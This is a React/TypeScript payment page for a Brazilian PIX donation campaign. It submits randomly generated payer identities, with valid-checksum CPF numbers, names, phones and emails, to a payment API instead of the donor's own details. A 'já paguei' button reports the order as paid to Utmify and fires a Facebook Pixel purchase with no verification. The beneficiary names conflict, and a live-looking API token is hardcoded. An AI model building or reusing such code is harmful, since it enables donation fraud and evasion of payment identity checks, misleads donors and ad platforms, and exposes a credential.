import React, { useEffect, useRef, useState } from "react";
import { useNavigate, useSearchParams } from "react-router-dom";
import VakinhaHeader from "../components/VakinhaHeader";

// ─── random data generators ──────────────────────────────────────────────────

function randomCPF(): string {
  const n = () => Math.floor(Math.random() * 9);
  const d = Array.from({ length: 9 }, n);
  const calc = (arr: number[], weights: number[]) =>
    arr.reduce((s, v, i) => s + v * weights[i], 0);
  const d1 = (11 - (calc(d, [10, 9, 8, 7, 6, 5, 4, 3, 2]) % 11)) % 10;
  d.push(d1);
  const d2 = (11 - (calc(d, [11, 10, 9, 8, 7, 6, 5, 4, 3, 2]) % 11)) % 10;
  d.push(d2);
  return d.join("");
}

function randomPhone(): string {
  const ddd = String(Math.floor(Math.random() * 89) + 11);
  const num = String(Math.floor(Math.random() * 900000000) + 900000000).slice(0, 9);
  return ddd + num;
}

function randomEmail(name: string): string {
  const domains = ["gmail.com", "hotmail.com", "outlook.com", "yahoo.com.br"];
  const slug = name.toLowerCase().replace(/\s+/g, ".").replace(/[^a-z.]/g, "");
  const rnd = Math.floor(Math.random() * 999);
  return `${slug}${rnd}@${domains[Math.floor(Math.random() * domains.length)]}`;
}

const NAMES = [
  "João Silva", "Maria Oliveira", "Pedro Santos", "Ana Souza",
  "Carlos Lima", "Fernanda Costa", "Lucas Pereira", "Juliana Rocha",
  "Rafael Alves", "Camila Ferreira",
];

function randomCustomer() {
  const name = NAMES[Math.floor(Math.random() * NAMES.length)];
  return {
    name,
    email: randomEmail(name),
    phone: randomPhone(),
    document: randomCPF(),
  };
}

// ─── transaction id extractor ────────────────────────────────────────────────

function extractTransactionHash(data: unknown): string | null {
  if (!data || typeof data !== "object") return null;
  const obj = data as Record<string, unknown>;
  // Banco BABYLON returns { id: "uuid", ... } at top level
  return (
    (obj.id as string) ??
    ((obj.data as Record<string, unknown>)?.id as string) ??
    null
  );
}

// ─── pix extractor ───────────────────────────────────────────────────────────

// Banco BABYLON PIX response shape:
// { id, pix: { qrcode: string, expirationDate, end2EndId, receiptUrl }, ... }
function extractPixData(data: unknown): { qrCode: string; qrCodeImage: string } | null {
  if (!data || typeof data !== "object") return null;
  const obj = data as Record<string, unknown>;

  const pix = (obj.pix ?? (obj.data as Record<string, unknown>)?.pix) as Record<string, unknown> | undefined;

  const qrCode =
    (pix?.qrcode as string) ??
    (pix?.pix_qr_code as string) ??
    (pix?.qr_code as string) ??
    "";

  if (!qrCode) return null;

  // Generate QR image via public service (Babylon doesn’t return base64)
  const imageUrl = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(qrCode)}`;

  return { qrCode, qrCodeImage: imageUrl };
}

// ─── icons ───────────────────────────────────────────────────────────────────

const CopyIcon = () => (
  <svg focusable="false" aria-hidden="true" viewBox="0 0 24 24" width="20" height="20" fill="currentColor">
    <path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2m0 16H8V7h11z" />
  </svg>
);

const CheckIcon = () => (
  <svg viewBox="0 0 24 24" width="20" height="20" fill="currentColor">
    <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z" />
  </svg>
);

// ─── styles ──────────────────────────────────────────────────────────────────

const s = {
  container: {
    maxWidth: 480,
    margin: "0 auto",
    fontFamily: "'DM Sans', sans-serif",
    background: "#f5f5f5",
    minHeight: "100vh",
  } as React.CSSProperties,

  card: {
    background: "#fff",
    marginBottom: 8,
    padding: "20px 18px",
  } as React.CSSProperties,

  inputRow: {
    display: "flex",
    alignItems: "center",
    border: "1px solid #d1d5db",
    borderRadius: 8,
    overflow: "hidden",
    background: "#f9fafb",
    marginTop: 10,
  } as React.CSSProperties,

  roInput: {
    flex: 1,
    border: "none",
    background: "transparent",
    padding: "10px 12px",
    fontSize: 13,
    color: "#374151",
    outline: "none",
    overflow: "hidden",
    textOverflow: "ellipsis",
    whiteSpace: "nowrap",
  } as React.CSSProperties,

  copyBtn: {
    background: "none",
    border: "none",
    cursor: "pointer",
    padding: "10px 12px",
    display: "flex",
    alignItems: "center",
    transition: "color 0.2s",
  } as React.CSSProperties,
};

// ─── Facebook Pixel ─────────────────────────────────────────────────────────

// Fire Facebook Pixel Purchase when payment is confirmed
function firePurchase(value: number) {
  if (typeof window !== "undefined" && typeof (window as any).fbq === "function") {
    (window as any).fbq("trackSingle", "1488460169954912", "Purchase", {
      value,
      currency: "BRL",
    });
  }
}

// ─── component ───────────────────────────────────────────────────────────────

type Step = "loading" | "pix" | "paid" | "error";

const PagamentosPage = () => {
  const navigate = useNavigate();
  const [searchParams] = useSearchParams();

  const valorParam = parseFloat(searchParams.get("valor") ?? "0");
  const amount = valorParam > 0 ? valorParam : 10;
  const amountCents = Math.round(amount * 100);

  const [step, setStep] = useState<Step>("loading");
  const [pixQrCode, setPixQrCode] = useState("");
  const [pixQrCodeImage, setPixQrCodeImage] = useState("");
  const [apiError, setApiError] = useState("");
  const [copied, setCopied] = useState(false);
  const [transactionHash, setTransactionHash] = useState<string | null>(null);

  const customerRef = useRef<ReturnType<typeof randomCustomer> | null>(null);
  const orderCreatedAtRef = useRef<string>("");
  const orderIdRef = useRef<string>("");

  const getUtms = () => {
    try {
      // Merge stored UTMs with any params currently in the URL (most authoritative source)
      const stored: Record<string, string> = JSON.parse(sessionStorage.getItem("utms") || "{}");
      const params = new URLSearchParams(window.location.search);
      const ALL_KEYS = ["utm_source","utm_campaign","utm_medium","utm_content","utm_term","src","sck"];
      ALL_KEYS.forEach((k) => { if (params.has(k)) stored[k] = params.get(k)!; });
      // Persist merged result back
      if (Object.keys(stored).length) sessionStorage.setItem("utms", JSON.stringify(stored));
      return stored;
    } catch { return {}; }
  };

  const toUtcString = (d: Date) =>
    d.toISOString().replace("T", " ").substring(0, 19);

  const sendUtmifyOrder = async (
    status: "waiting_payment" | "paid",
    approvedDate: string | null
  ) => {
    const utms = getUtms();
    const customer = customerRef.current;
    if (!customer) return;
    const body = {
      orderId: orderIdRef.current || transactionHash || "unknown",
      platform: "AjudeNos",
      paymentMethod: "pix",
      status,
      createdAt: orderCreatedAtRef.current,
      approvedDate,
      refundedAt: null,
      customer: {
        name: customer.name,
        email: customer.email,
        phone: customer.phone,
        document: customer.document,
        country: "BR",
      },
      products: [{
        id: "rifa-diego-faustino",
        name: "Rifa Diego Faustino",
        planId: null,
        planName: null,
        quantity: 1,
        priceInCents: amountCents,
      }],
      trackingParameters: {
        src: utms.src ?? null,
        sck: utms.sck ?? null,
        utm_source: utms.utm_source ?? null,
        utm_campaign: utms.utm_campaign ?? null,
        utm_medium: utms.utm_medium ?? null,
        utm_content: utms.utm_content ?? null,
        utm_term: utms.utm_term ?? null,
      },
      commission: {
        totalPriceInCents: amountCents,
        gatewayFeeInCents: Math.round(amountCents * 0.03),
        userCommissionInCents: Math.round(amountCents * 0.97),
      },
      isTest: false,
    };
    try {
      await fetch("https://api.utmify.com.br/api-credentials/orders", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          "x-api-token": "JjObnSTglPuwVfyK3PBVaFGlcKKS885LQrhe",
        },
        body: JSON.stringify(body),
      });
    } catch {
      // silent — don't block payment flow
    }
  };

  const copyToClipboard = (text: string) => {
    navigator.clipboard.writeText(text).catch(() => {
      const el = document.createElement("textarea");
      el.value = text;
      document.body.appendChild(el);
      el.select();
      document.execCommand("copy");
      document.body.removeChild(el);
    });
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  useEffect(() => {
    // ── Capture UTMs from URL immediately on mount ──
    const UTM_KEYS = ["utm_source","utm_campaign","utm_medium","utm_content","utm_term","src","sck"];
    const urlParams = new URLSearchParams(window.location.search);
    const storedUtms: Record<string, string> = JSON.parse(sessionStorage.getItem("utms") || "{}");
    let foundUtm = false;
    UTM_KEYS.forEach(k => { if (urlParams.has(k)) { storedUtms[k] = urlParams.get(k)!; foundUtm = true; } });
    if (foundUtm) sessionStorage.setItem("utms", JSON.stringify(storedUtms));

    if (!document.querySelector('script[data-utmify-pixel]')) {
      (window as Window & { pixelId?: string }).pixelId = "699fed529f103cff7458c6ae";
      const a = document.createElement("script");
      a.setAttribute("async", "");
      a.setAttribute("defer", "");
      a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
      a.setAttribute("data-utmify-pixel", "");
      document.head.appendChild(a);
    }
    if (!document.querySelector('script[src="https://cdn.utmify.com.br/scripts/utms/latest.js"]')) {
      const b = document.createElement("script");
      b.src = "https://cdn.utmify.com.br/scripts/utms/latest.js";
      b.setAttribute("data-utmify-prevent-xcod-sck", "");
      b.setAttribute("data-utmify-prevent-subids", "");
      b.async = true;
      b.defer = true;
      document.head.appendChild(b);
    }
  }, []);

  useEffect(() => {
    const generate = async () => {
      try {
        const customer = randomCustomer();
        customerRef.current = customer;
        const now = new Date();
        orderCreatedAtRef.current = now.toISOString().replace("T", " ").substring(0, 19);
        const res = await fetch("/api/invictus/transactions", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            amount: amountCents,
            customer,
          }),
        });

        const data = await res.json();

        if (!res.ok) {
          const msg =
            (data?.message as string) ??
            (data?.error as string) ??
            (typeof data?.errors === "object"
              ? Object.values(data.errors as Record<string, string[]>).flat().join(" ")
              : null) ??
            `Erro ${res.status} ao gerar PIX.`;
          setApiError(msg);
          setStep("error");
          return;
        }

        const pix = extractPixData(data);
        if (!pix || !pix.qrCode) {
          setApiError("PIX gerado, mas os dados de pagamento não foram retornados pela API.");
          setStep("error");
          return;
        }

        setPixQrCode(pix.qrCode);
        setPixQrCodeImage(pix.qrCodeImage);
        const hash = extractTransactionHash(data);
        if (hash) { setTransactionHash(hash); orderIdRef.current = hash; }
        setStep("pix");
        sendUtmifyOrder("waiting_payment", null);
      } catch (err) {
        setApiError("Erro de conexão. Verifique sua internet e tente novamente.");
        setStep("error");
      }
    };

    generate();
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  // ── Poll for payment confirmation ─────────────────────────────────────────
  useEffect(() => {
    if (step !== "pix" || !transactionHash) return;

    let stopped = false;
    let pollCount = 0;
    const MAX_POLLS = 120; // ~10 minutes at 5 s intervals
    const PAID_STATUSES = ["paid", "approved", "completed", "confirmed"];

    const poll = async () => {
      if (stopped || pollCount >= MAX_POLLS) return;
      pollCount++;
      try {
        const res = await fetch(`/api/invictus/transactions?id=${transactionHash}`);
        if (res.ok) {
          const json = await res.json();
          // API response: { success: true, data: { status: "paid", ... } }
          // Banco BABYLON returns status at top level
          const status = (
            (json?.status as string) ??
            (json?.data?.status as string) ??
            ""
          ).toLowerCase();
          if (PAID_STATUSES.includes(status)) {
            stopped = true;
            firePurchase(amount);
            sendUtmifyOrder("paid", toUtcString(new Date()));
            setStep("paid");
            return;
          }
        }
      } catch {
        // silent — keep polling
      }
      if (!stopped) setTimeout(poll, 5000);
    };

    const timer = setTimeout(poll, 5000);
    return () => {
      stopped = true;
      clearTimeout(timer);
    };
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [step, transactionHash]);

  // ── Paid ─────────────────────────────────────────────────────────────────
  if (step === "paid") {
    return (
      <div style={s.container}>
        <VakinhaHeader />
        <div
          style={{
            ...s.card,
            textAlign: "center",
            padding: "60px 24px",
            minHeight: "60vh",
            display: "flex",
            flexDirection: "column",
            alignItems: "center",
            justifyContent: "center",
            gap: 16,
          }}
        >
          <div style={{ fontSize: 56 }}>💚</div>
          <h2 style={{ fontSize: 22, fontWeight: 700, color: "#111827", margin: 0 }}>
            Obrigado pela sua doação!
          </h2>
          <p style={{ color: "#6b7280", fontSize: 15, margin: 0 }}>
            Sua contribuição vai fazer a diferença para Léia Ribeiro e sua família.
          </p>
          <button
            onClick={() => navigate("/ajudenos")}
            style={{
              marginTop: 16,
              padding: "12px 28px",
              background: "linear-gradient(135deg, #24ca68, #1aaa54)",
              color: "#fff",
              border: "none",
              borderRadius: 10,
              fontWeight: 700,
              fontSize: 15,
              cursor: "pointer",
            }}
          >
            Voltar para a vaquinha
          </button>
        </div>
      </div>
    );
  }

  // ── Loading ───────────────────────────────────────────────────────────────
  if (step === "loading") {
    return (
      <div style={s.container}>
        <VakinhaHeader />
        <div
          style={{
            ...s.card,
            textAlign: "center",
            padding: "80px 24px",
            display: "flex",
            flexDirection: "column",
            alignItems: "center",
            gap: 20,
          }}
        >
          <div
            style={{
              width: 48,
              height: 48,
              border: "4px solid #e5e7eb",
              borderTopColor: "#24ca68",
              borderRadius: "50%",
              animation: "spin 0.7s linear infinite",
            }}
          />
          <style>{`@keyframes spin { to { transform: rotate(360deg); } }`}</style>
          <p style={{ color: "#6b7280", fontSize: 15, margin: 0 }}>Gerando seu PIX...</p>
        </div>
      </div>
    );
  }

  // ── Error ─────────────────────────────────────────────────────────────────
  if (step === "error") {
    return (
      <div style={s.container}>
        <VakinhaHeader />
        <div
          style={{
            ...s.card,
            textAlign: "center",
            padding: "60px 24px",
            display: "flex",
            flexDirection: "column",
            alignItems: "center",
            gap: 16,
          }}
        >
          <div style={{ fontSize: 48 }}>⚠️</div>
          <h2 style={{ fontSize: 18, fontWeight: 700, color: "#111827", margin: 0 }}>
            Não foi possível gerar o PIX
          </h2>
          <p
            style={{
              color: "#dc2626",
              fontSize: 14,
              margin: 0,
              background: "#fef2f2",
              border: "1px solid #fecaca",
              borderRadius: 8,
              padding: "10px 14px",
              maxWidth: 360,
            }}
          >
            {apiError}
          </p>
          <button
            onClick={() => { setStep("loading"); window.location.reload(); }}
            style={{
              marginTop: 8,
              padding: "10px 24px",
              background: "linear-gradient(135deg, #24ca68, #1aaa54)",
              color: "#fff",
              border: "none",
              borderRadius: 8,
              fontWeight: 700,
              fontSize: 14,
              cursor: "pointer",
            }}
          >
            Tentar novamente
          </button>
          <button
            onClick={() => navigate("/ajudenos")}
            style={{
              background: "none",
              border: "none",
              color: "#6b7280",
              fontSize: 14,
              cursor: "pointer",
              textDecoration: "underline",
            }}
          >
            ← Voltar para a vaquinha
          </button>
        </div>
      </div>
    );
  }

  // ── PIX ───────────────────────────────────────────────────────────────────
  return (
    <div style={s.container}>
      <VakinhaHeader />

      {/* Header */}
      <div
        style={{
          background: "#fff",
          padding: "24px 18px 20px",
          marginBottom: 8,
          textAlign: "center",
        }}
      >
        <h1
          style={{
            fontSize: 20,
            fontWeight: 700,
            color: "#111827",
            margin: 0,
            lineHeight: 1.35,
          }}
        >
          Efetue o pagamento para{" "}
          <span style={{ display: "block" }}>confirmar a contribuição</span>
        </h1>
        <p style={{ margin: "10px 0 0", fontSize: 15, color: "#374151" }}>
          Valor:{" "}
          <strong style={{ color: "#111827" }}>
            R$ {amount.toFixed(2).replace(".", ",")}
          </strong>
        </p>
      </div>

      {/* QR Code image */}
      {pixQrCodeImage && (
        <div style={{ ...s.card, textAlign: "center" }}>
          <p
            style={{
              fontWeight: 700,
              fontSize: 14,
              margin: "0 0 14px",
              color: "#111827",
            }}
          >
            Escaneie o QR Code
          </p>
          <div style={{ display: "flex", justifyContent: "center", marginBottom: 8 }}>
            <img
              src={pixQrCodeImage}
              alt="QR Code PIX"
              style={{ width: 200, height: 200, display: "block" }}
            />
          </div>
          <p style={{ fontSize: 12, color: "#6b7280", margin: 0 }}>
            No app do seu banco, escolha <strong>Pix › Ler QR Code</strong>
          </p>
        </div>
      )}

      {/* Copia e Cola */}
      {pixQrCode && (
        <div style={s.card}>
          <div
            style={{
              display: "flex",
              alignItems: "flex-start",
              gap: 12,
              marginBottom: 14,
            }}
          >
            <div style={{ flexShrink: 0, color: "#6b7280" }}>
              <svg viewBox="0 0 29 46" width="32" height="40" fill="#6b7280">
                <path d="M4.3 45.7h17.1a4.3 4.3 0 004.3-4.3v-7.1h2.9a.7.7 0 00.7-.7V12.1a.7.7 0 00-.7-.7h-2.9V4.3A4.3 4.3 0 0021.4 0H4.3A4.3 4.3 0 000 4.3v37.1a4.3 4.3 0 004.3 4.3zM1.4 4.3A2.9 2.9 0 014.3 1.4h17.1A2.9 2.9 0 0124.3 4.3v1.4H1.4zm22.9 37.1V42.9a2.9 2.9 0 01-2.9 2.9H4.3a2.9 2.9 0 01-2.9-2.9v-1.4h22.9zm-22.9-6v-4.3H24.3v4.3zm22.9-14.3v2.9H6.4V17.1h18.6v2.9zm-18.6 4.3H24.3v2.9H5.7z" />
              </svg>
            </div>
            <p style={{ fontSize: 14, color: "#374151", margin: 0, lineHeight: 1.5 }}>
              <strong>Clique no botão</strong> para{" "}
              <strong>copiar o código</strong> e escolha pagar via{" "}
              <strong>Pix Copia e Cola</strong> no aplicativo do seu banco.
            </p>
          </div>
          <div style={s.inputRow}>
            <input readOnly style={s.roInput} value={pixQrCode} />
            <button
              style={{ ...s.copyBtn, color: copied ? "#24ca68" : "#6b7280" }}
              onClick={() => copyToClipboard(pixQrCode)}
            >
              {copied ? <CheckIcon /> : <CopyIcon />}
            </button>
          </div>
        </div>
      )}

      {/* Confirm paid */}
      <div style={{ ...s.card, textAlign: "center" }}>
        <button
          onClick={() => { firePurchase(amount); sendUtmifyOrder("paid", toUtcString(new Date())); setStep("paid"); }}
          style={{
            background: "none",
            border: "2px solid #24ca68",
            color: "#24ca68",
            borderRadius: 8,
            padding: "10px 28px",
            fontWeight: 700,
            fontSize: 15,
            cursor: "pointer",
          }}
        >
          Tudo certo, já paguei!
        </button>
      </div>

      
      {/* How to pay via QR */}
      {pixQrCodeImage && (
        <div style={s.card}>
          <p style={{ fontWeight: 700, fontSize: 14, margin: "0 0 14px", color: "#111827" }}>
            Pix com QR Code
          </p>
          <div style={{ display: "flex", alignItems: "flex-start", gap: 12, marginBottom: 16 }}>
            <div style={{ flexShrink: 0 }}>
              <svg viewBox="0 0 37.861 45.719" width="38" height="46" fill="#404040">
                <path d="M10 42.86h5.71a.67.67 0 00.72-.72.67.67 0 00-.71-.71H10a.67.67 0 00-.71.71.67.67 0 00.71.72z" />
                <path d="M10.71 16.43v12.86a2.1 2.1 0 002.14 2.14h22.86a2.1 2.1 0 002.14-2.14V16.43a2.1 2.1 0 00-2.14-2.14H12.86a2.1 2.1 0 00-2.14 2.14zm25-.71a.67.67 0 01.71.71v12.86a.67.67 0 01-.71.71H12.86a.67.67 0 01-.71-.71V16.43a.67.67 0 01.71-.71z" />
                <path d="M24.29 35.13v3.44H1.43V7.14h22.86v7.77h1.43V4.29A4.3 4.3 0 0021.43 0H4.29A4.3 4.3 0 000 4.29v37.14a4.3 4.3 0 004.29 4.29h17.14a4.3 4.3 0 004.29-4.29V30.44h-1.43zM1.43 4.29a2.87 2.87 0 012.86-2.86h17.14a2.87 2.87 0 012.86 2.86V5.71H1.43zm22.86 37.14a2.87 2.87 0 01-2.86 2.86H4.29a2.87 2.87 0 01-2.86-2.86v-1.43h22.86z" />
              </svg>
            </div>
            <p style={{ fontSize: 13, color: "#374151", margin: 0, lineHeight: 1.6 }}>
              <strong>1.</strong> No aplicativo do seu banco,{" "}
              <strong>escolha a opção "Ler QR Code" no menu Pix.</strong>
            </p>
          </div>
          <div style={{ display: "flex", alignItems: "flex-start", gap: 12 }}>
            <div style={{ flexShrink: 0 }}>
              <svg viewBox="0 0 46.866 56.252" width="46" height="56" fill="#404040">
                <path d="M3.18 2.61h1v2h-1zM6.18 2.61h1v2h-1zM9.18 2.61h1v2h-1zM21.42 32.84H1.43V7.14h35.7v3.7h1.43V.72a.71.71 0 00-.71-.71H.71A.71.71 0 000 .72v32.84a.71.71 0 00.71.71h20.71zM1.43 1.43h35.7v4.28h-35.7z" />
                <path d="M31.16 53.4h5.71a.67.67 0 000-1.43H31.16a.67.67 0 000 1.43zM42.58 10.56H25.45a4.3 4.3 0 00-4.28 4.28v37.12a4.3 4.3 0 004.28 4.28h17.13a4.3 4.3 0 004.28-4.28V14.84a4.3 4.3 0 00-4.28-4.28zm-19.99 4.28a2.86 2.86 0 012.86-2.86h17.13a2.86 2.86 0 012.86 2.86v1.43H22.59zm22.85 37.12a2.86 2.86 0 01-2.86 2.86H25.45a2.86 2.86 0 01-2.86-2.86v-1.43h22.85zm0-6.1v3.25H22.59V17.71h22.85z" />
              </svg>
            </div>
            <p style={{ fontSize: 13, color: "#374151", margin: 0, lineHeight: 1.6 }}>
              <strong>2. Escaneie o QR Code.</strong> Confirme as informações e{" "}
              <strong>finalize</strong>
            </p>
          </div>
        </div>
      )}

      {/* Back */}
      <div style={{ textAlign: "center", padding: "16px 0 40px" }}>
        <button
          onClick={() => navigate("/ajudenos")}
          style={{
            background: "none",
            border: "none",
            color: "#6b7280",
            fontSize: 14,
            cursor: "pointer",
            textDecoration: "underline",
          }}
        >
          ← Voltar para a vaquinha
        </button>
      </div>
    </div>
  );
};

export default PagamentosPage;
